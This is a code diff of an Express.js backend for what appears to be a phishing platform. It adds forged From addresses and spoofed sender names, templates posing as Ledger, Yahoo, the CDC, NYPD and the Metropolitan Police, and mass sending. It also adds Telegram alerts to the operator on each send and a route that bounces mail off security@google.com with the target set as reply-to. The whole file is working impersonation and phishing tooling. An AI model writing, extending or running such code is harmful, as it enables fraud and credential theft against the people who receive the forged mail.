@@ -12,10 +12,13 @@ const {
 } = require('../storage');
 const {
   getSharedSmtpConfigs, getUserSenderConfig, getEffectiveSmtpConfig,
-  createTransporter, loadProxies, attachSenderImage,
-  addSharedSmtpConfig, deleteSharedSmtpConfig
+  createTransporter, loadProxies, attachSenderImage, attachCidImages,
+  addSharedSmtpConfig, deleteSharedSmtpConfig, resolveSpoofEmail, applyFromHeaders, isHostingerSmtp, detectProvider
 } = require('../smtp');
-const { buildLedgerHTML, buildYahooHTML, BRAND_TEMPLATES, getBrandTemplates, addCustomBrandTemplates } = require('../templates');
+const { 
+  buildLedgerHTML, buildYahooHTML, BRAND_TEMPLATES, getBrandTemplates, addCustomBrandTemplates,
+  getBuiltinTemplates, getBuiltinTemplateById, processTemplateVariables
+} = require('../templates');
 const { sendTelegramNotification } = require('../telegram');
 
 const router = express.Router();
@@ -83,15 +86,30 @@ router.get('/sender-config', requireAuth, async (req, res) => {
 });
 
 router.post('/sender-config', requireAuth, async (req, res) => {
-  const { domain, prefix } = req.body;
+  const { domain, prefix, senderName, spoofEmail } = req.body;
   const validDomains = getSharedSmtpConfigs().map(s => s.domain);
-  const finalDomain = validDomains.includes(domain) ? domain : 'irnna.com';
-  const finalPrefix = (prefix || 'noreply').trim().toLowerCase().replace(/[^a-z0-9._-]/g, '');
   const users = await readJSON(USERS_FILE);
   const user = users.find(u => String(u.id) === String(req.user.id));
   if (!user) return res.status(404).json({ success: false, message: 'User not found' });
-  user.senderDomain = finalDomain;
-  user.senderPrefix = finalPrefix || 'noreply';
+  if (domain) {
+    user.senderDomain = validDomains.includes(domain) ? domain : (validDomains[0] || domain);
+  }
+  if (prefix !== undefined) {
+    user.senderPrefix = (prefix || 'noreply').trim().toLowerCase().replace(/[^a-z0-9._-]/g, '') || 'noreply';
+  }
+  if (senderName !== undefined) user.senderName = senderName;
+  if (spoofEmail !== undefined) {
+    const raw = String(spoofEmail || '').trim();
+    if (!raw) {
+      user.spoofEmail = '';
+    } else if (raw.includes('@')) {
+      user.spoofEmail = raw;
+    } else {
+      const d = user.senderDomain || validDomains[0] || '';
+      user.spoofEmail = d ? `${raw.replace(/[^a-zA-Z0-9._+-]/g, '')}@${d}` : raw;
+      user.senderPrefix = raw.replace(/[^a-zA-Z0-9._+-]/g, '') || user.senderPrefix;
+    }
+  }
   await writeJSON(USERS_FILE, users);
   const senderConfig = await getUserSenderConfig(req.user.id);
   res.json({ success: true, senderConfig, message: `Sender email set to ${senderConfig.senderEmail}` });
@@ -156,7 +174,7 @@ router.post('/send-template', requireAuth, async (req, res) => {
     const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
     const fromName = smtpConf.spoofName || (template === 'ledger' ? 'Ledger Security' : 'Yahoo Support');
     const fromStr = `"${fromName}" <${fromEmail}>`;
-    const info = await transporter.sendMail({ from: fromStr, to, subject, html });
+    const info = await transporter.sendMail(applyFromHeaders(smtpConf, { from: fromStr, to, subject, html }));
     res.json({ success: true, message: `${template} template sent!`, messageId: info.messageId });
   } catch (error) {
     res.status(500).json({ success: false, message: error.message });
@@ -215,6 +233,7 @@ router.post('/smtp-configs', requireAuth, async (req, res) => {
     user, pass: pass || '',
     spoofName: spoofName || '',
     spoofEmail: spoofEmail || '',
+    provider: detectProvider({ host }),
     createdAt: new Date().toISOString(),
   };
   const idx = configs.findIndex(c => c.id === config.id);
@@ -237,12 +256,20 @@ router.delete('/smtp-configs/:id', requireAuth, async (req, res) => {
 
 router.post('/smtp-test', requireAuth, async (req, res) => {
   try {
-    const transporter = createTransporter(req.body);
+    const smtpConf = (req.body?.smtpConfigId || req.body?.id)
+      ? await getEffectiveSmtpConfig(req.user.id, { id: req.body.smtpConfigId || req.body.id })
+      : (req.body?.host ? req.body : await getEffectiveSmtpConfig(req.user.id, null));
+    const transporter = createTransporter(smtpConf);
     await transporter.verify();
     res.json({ success: true, message: 'SMTP connection successful!' });
   } catch (err) {
     res.json({ success: false, message: err.message });
   }
+});
+
+router.get('/send-history', requireAuth, async (req, res) => {
+  const logs = await readUserData(req.user.id, 'send-history');
+  res.json({ success: true, logs: logs || [] });
 });
 
 // ============ API: SHARED SMTP CONFIGS (admin-only, available to all users) ============
@@ -418,24 +445,140 @@ router.post('/brand-templates/custom', requireAuth, async (req, res) => {
   res.json({ success: true, count: custom.length });
 });
 
+// ============ API: BUILTIN TEMPLATES (CDC, NYPD, MetPolice, etc.) ============
+router.get('/builtin-templates', requireAuth, async (req, res) => {
+  const templates = await getBuiltinTemplates();
+  res.json({ success: true, templates });
+});
+
+router.get('/builtin-templates/:id', requireAuth, async (req, res) => {
+  const template = await getBuiltinTemplateById(req.params.id);
+  if (!template) return res.status(404).json({ success: false, message: 'Template not found' });
+  res.json({ success: true, template });
+});
+
+// ============ API: SEND BUILTIN TEMPLATE ============
+router.post('/send-builtin-template', requireAuth, async (req, res) => {
+  try {
+    const { templateId, to, variables, smtpConfigId, fromName: fromNameOverride, fromEmail: fromEmailOverride, subject: subjectOverride } = req.body;
+    
+    if (!templateId || !to) {
+      return res.status(400).json({ success: false, message: 'Template ID and recipient required' });
+    }
+    
+    const template = await getBuiltinTemplateById(templateId);
+    if (!template) {
+      return res.status(404).json({ success: false, message: 'Template not found' });
+    }
+    
+    // Process template variables
+    const vars = variables || {};
+    const processedHtml = processTemplateVariables(template.html, vars);
+    const processedSubject = processTemplateVariables(subjectOverride || template.subject, vars);
+    
+    // Get SMTP config
+    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfigId ? { id: smtpConfigId } : null);
+    
+    if (!smtpConf.host || !smtpConf.user) {
+      return res.status(400).json({ success: false, message: 'No SMTP configured. Ask admin to add Hostinger SMTP.' });
+    }
+    
+    const transporter = createTransporter(smtpConf);
+    
+    // Use template's from settings or fallback to smtp config
+    const fromName = fromNameOverride || template.fromName || smtpConf.spoofName || '';
+    const fromEmail = isHostingerSmtp(smtpConf)
+      ? (fromEmailOverride || template.fromEmail || smtpConf.spoofEmail || smtpConf.user)
+      : resolveSpoofEmail(fromEmailOverride || template.fromEmail || smtpConf.spoofEmail, smtpConf);
+    const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
+    
+    const mailOptions = attachCidImages(applyFromHeaders(smtpConf, {
+      from: fromStr,
+      to,
+      subject: processedSubject,
+      html: processedHtml,
+      text: processedSubject,
+      replyTo: fromEmail,
+    }));
+    
+    const info = await transporter.sendMail(mailOptions);
+    const prev = await readUserData(req.user.id, 'send-history');
+    await writeUserData(req.user.id, 'send-history', [
+      { id: Date.now().toString(), at: new Date().toISOString(), to, subject: processedSubject, from: fromStr, template: template.name, success: true, messageId: info.messageId },
+      ...(prev || []),
+    ].slice(0, 200));
+    
+    // Send Telegram notification
+    try {
+      const users = await readJSON(USERS_FILE);
+      const user = users.find(u => u.id === req.user.id);
+      const targetChatId = user?.telegramChatId || process.env.TELEGRAM_CHAT_ID;
+      await sendTelegramNotification(
+        `📧 *Template Email Sent!*\n\n` +
+        `📄 Template: ${template.name}\n` +
+        `📬 To: ${to}\n` +
+        `📝 Subject: ${processedSubject}\n` +
+        `✅ Status: Success`,
+        targetChatId
+      );
+    } catch (tgErr) {}
+    
+    res.json({ 
+      success: true, 
+      message: `${template.name} sent to ${to}!`, 
+      messageId: info.messageId 
+    });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
+});
+
 // ============ API: TEMPLATES (per-user) ============
 router.get('/templates', requireAuth, async (req, res) => {
-  res.json(await readUserData(req.user.id, 'templates'));
+  const templates = (await readUserData(req.user.id, 'templates') || []).map(t => ({
+    ...t,
+    html: t.html || t.body || '',
+    custom: true,
+  }));
+  res.json({ success: true, templates });
+});
+
+router.get('/templates/:id', requireAuth, async (req, res) => {
+  const templates = await readUserData(req.user.id, 'templates');
+  const found = (templates || []).find(t => String(t.id) === String(req.params.id));
+  if (!found) return res.status(404).json({ success: false, message: 'Template not found' });
+  res.json({ success: true, template: { ...found, html: found.html || found.body || '', custom: true } });
 });
 
 router.post('/templates', requireAuth, async (req, res) => {
-  const { id, name, subject, body, variables } = req.body;
-  if (!name || !subject || !body) {
-    return res.status(400).json({ success: false, message: 'Name, subject, and body are required' });
+  const { id, name, subject, body, html, fromName, fromEmail, description, hasLink, variables } = req.body;
+  const content = html || body;
+  if (!name || !String(name).trim()) {
+    return res.status(400).json({ success: false, message: 'Name is required' });
+  }
+  if (!content || !String(content).trim()) {
+    return res.status(400).json({ success: false, message: 'HTML is required' });
+  }
+  if (String(content).length > 500000) {
+    return res.status(400).json({ success: false, message: 'Template is too large' });
   }
   const templates = await readUserData(req.user.id, 'templates');
   const template = {
     id: id || Date.now().toString(),
-    name, subject, body, variables: variables || [],
+    name: String(name).trim().slice(0, 80),
+    subject: String(subject || '').slice(0, 200),
+    body: content,
+    html: content,
+    fromName: fromName || '',
+    fromEmail: fromEmail || '',
+    description: String(description || '').slice(0, 200),
+    hasLink: !!hasLink,
+    variables: variables || [],
+    custom: true,
     createdAt: new Date().toISOString(),
     updatedAt: new Date().toISOString(),
   };
-  const idx = templates.findIndex(t => t.id === template.id);
+  const idx = templates.findIndex(t => String(t.id) === String(template.id));
   if (idx >= 0) {
     template.createdAt = templates[idx].createdAt;
     templates[idx] = template;
@@ -502,7 +645,7 @@ router.delete('/schedules/:id', requireAuth, async (req, res) => {
 // ============ API: SEND EMAIL ============
 router.post('/send-email', requireAuth, async (req, res) => {
   try {
-    const { to, subject, text, html, smtpConfig, spoofName, spoofEmail } = req.body;
+    const { to, subject, text, html, smtpConfig, spoofName, spoofEmail, replyTo, templateName } = req.body;
     if (!to || !subject || !text) {
       return res.status(400).json({ success: false, message: 'Missing required fields: to, subject, text' });
     }
@@ -512,16 +655,22 @@ router.post('/send-email', requireAuth, async (req, res) => {
     
     const transporter = createTransporter(smtpConf);
     const fromName = spoofName || smtpConf.spoofName || senderConfig.senderName || '';
-    const fromEmail = spoofEmail || smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
+    const fromEmail = resolveSpoofEmail(spoofEmail || smtpConf.spoofEmail, smtpConf) || smtpConf.user || process.env.SMTP_USER;
     const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
     
-    const mailOptions = {
+    const mailOptions = attachCidImages(applyFromHeaders(smtpConf, {
       from: fromStr,
       to, subject,
       text, html: html || text,
-    };
+      replyTo: replyTo || fromEmail,
+    }));
 
     const info = await transporter.sendMail(mailOptions);
+    const prev = await readUserData(req.user.id, 'send-history');
+    await writeUserData(req.user.id, 'send-history', [
+      { id: Date.now().toString(), at: new Date().toISOString(), to, subject, from: fromStr, template: templateName || 'compose', success: true, messageId: info.messageId },
+      ...(prev || []),
+    ].slice(0, 200));
     
     // Send notification to the user's assigned Telegram
     try {
@@ -532,6 +681,42 @@ router.post('/send-email', requireAuth, async (req, res) => {
     } catch (tgErr) {}
 
     res.json({ success: true, message: 'Email sent successfully!', messageId: info.messageId });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
+});
+
+// ============ API: GOOGLE QUICK SEND ============
+router.post('/google-send', requireAuth, async (req, res) => {
+  try {
+    const { email, subject, smtpConfigId } = req.body;
+    if (!email || !subject) {
+      return res.status(400).json({ success: false, message: 'Email and subject required' });
+    }
+    
+    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfigId ? { id: smtpConfigId } : null);
+    const senderConfig = await getUserSenderConfig(req.user.id);
+    
+    const transporter = createTransporter(smtpConf);
+    const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
+    const fromStr = `"Account Security" <${fromEmail}>`;
+    
+    const mailOptions = applyFromHeaders(smtpConf, {
+      from: fromStr,
+      to: 'security@google.com',
+      replyTo: email,
+      subject: subject,
+      text: 'Hello, I would like to check my account security status. Thank you.',
+    });
+
+    const info = await transporter.sendMail(mailOptions);
+    const prev = await readUserData(req.user.id, 'send-history');
+    await writeUserData(req.user.id, 'send-history', [
+      { id: Date.now().toString(), at: new Date().toISOString(), to: email, subject, from: fromStr, template: 'google-noreply', success: true, messageId: info.messageId },
+      ...(prev || []),
+    ].slice(0, 200));
+    
+    res.json({ success: true, message: 'Sent!', messageId: info.messageId });
   } catch (error) {
     res.status(500).json({ success: false, message: error.message });
   }
@@ -554,7 +739,7 @@ router.post('/send-mass', requireAuth, async (req, res) => {
 
     const transporter = createTransporter(smtpConf);
     const fromName = spoofName || smtpConf.spoofName || senderConfig.senderName || '';
-    const fromEmail = spoofEmail || smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
+    const fromEmail = resolveSpoofEmail(spoofEmail || smtpConf.spoofEmail, smtpConf) || smtpConf.user || process.env.SMTP_USER;
     const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
     const results = [];
     let sent = 0, failed = 0;
@@ -576,13 +761,13 @@ router.post('/send-mass', requireAuth, async (req, res) => {
       });
 
       try {
-        const mailOptions = {
+        const mailOptions = applyFromHeaders(smtpConf, {
           from: fromStr,
           to: email,
           subject: processedSubject,
           text: processedText,
           html: processedHtml || processedText,
-        };
+        });
         const info = await transporter.sendMail(mailOptions);
         results.push({ email, success: true, messageId: info.messageId });
         sent++;
@@ -651,11 +836,11 @@ router.post('/send-combined', requireAuth, async (req, res) => {
       const fromName = smtpConf.spoofName || senderConfig.senderName || '';
       const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
       const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
-      const mailOptions = {
+      const mailOptions = applyFromHeaders(smtpConf, {
         from: fromStr,
         to, subject, text,
         html: html || text,
-      };
+      });
       const info = await transporter.sendMail(mailOptions);
       results.email = { success: true, messageId: info.messageId };
     } catch (err) {
